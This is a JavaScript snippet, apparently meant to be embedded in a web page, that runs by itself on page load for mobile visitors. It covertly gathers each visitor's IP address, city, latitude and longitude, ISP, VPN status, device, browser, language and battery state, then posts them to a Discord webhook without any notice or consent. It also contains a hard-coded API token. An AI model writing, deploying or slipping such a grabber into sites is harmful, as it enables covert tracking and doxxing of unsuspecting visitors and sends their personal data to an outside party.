async function sendUserDataToDiscord() {
  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "<YOUR_DISCORD_WEBHOOK_URL_HERE>";
  if (!discordWebhookUrl) {
    console.error("Discord webhook URL is not set. Aborting data send.");
    return;
  }

  try {
    let geoData = null;
    let vpnData = { badip: "Unknown" };

    // Geo IP lookup with fallback
    try {
      const geoResponse = await fetch("https://json.geoiplookup.io");
      if (geoResponse.ok) {
        geoData = await geoResponse.json();
      } else {
        throw new Error("Primary Geo IP lookup failed.");
      }
    } catch (error) {
      console.warn("Primary Geo IP lookup failed, trying fallback.");

      try {
        const fallbackResponse = await fetch("https://ipinfo.io/json?token=e8449909af1d1b");
        if (fallbackResponse.ok) {
          const fallbackData = await fallbackResponse.json();
          geoData = {
            ip: fallbackData.ip,
            country_name: fallbackData.country,
            city: fallbackData.city,
            region: fallbackData.region,
            latitude: fallbackData.loc ? fallbackData.loc.split(",")[0] : "N/A",
            longitude: fallbackData.loc ? fallbackData.loc.split(",")[1] : "N/A",
            asn: fallbackData.asn ? fallbackData.asn : "Unknown",
            org: fallbackData.org ? fallbackData.org : "Unknown",
          };
        } else {
          console.warn("Fallback Geo IP lookup also failed.");
        }
      } catch (fallbackError) {
        console.warn("Both Geo IP lookups failed:", fallbackError);
      }
    }

    // VPN Data Fetch
    try {
      const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
      if (vpnResponse.ok) {
        vpnData = await vpnResponse.json();
      } else {
        console.warn("VPN lookup failed with status:", vpnResponse.status);
      }
    } catch (error) {
      console.warn("VPN lookup service unavailable:", error);
    }

    // Device Data for mobile compatibility
    const battery = navigator.getBattery ? await navigator.getBattery() : null;
    const deviceData = {
      platform: navigator.platform || "Unknown",
      userAgent: navigator.userAgent || "Unknown",
      language: navigator.language || "Unknown",
      batteryLevel: battery ? battery.level * 100 : "N/A",
      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A",
    };

    // Format message content for Discord
    const messageContent = `
      **User Data:**
      ${geoData ? `
      - IP Address: ${geoData.ip}
      - Country: ${geoData.country_name}
      - City: ${geoData.city}
      - Region: ${geoData.region || "N/A"}
      - Latitude: ${geoData.latitude}
      - Longitude: ${geoData.longitude}
      - ASN: ${geoData.asn}
      - ISP: ${geoData.org}
      ` : "- Location Data Unavailable"}
      - Bad IP: ${vpnData.badip}
      - Device: ${deviceData.platform}
      - Browser: ${deviceData.userAgent}
      - Language: ${deviceData.language}
      - Battery Level: ${deviceData.batteryLevel}%
      - Charging: ${deviceData.isCharging}
    `;

    const discordPayload = { content: messageContent };

    // Send data to Discord webhook
    const discordResponse = await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      throw new Error("Failed to send data to Discord.");
    }

    console.log("Data sent successfully.");
  } catch (error) {
    console.error("Failed to send user data:", error);
  }
}

// Run data send function once the page is fully loaded
window.addEventListener("load", () => {
  if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
    sendUserDataToDiscord();
  }
});
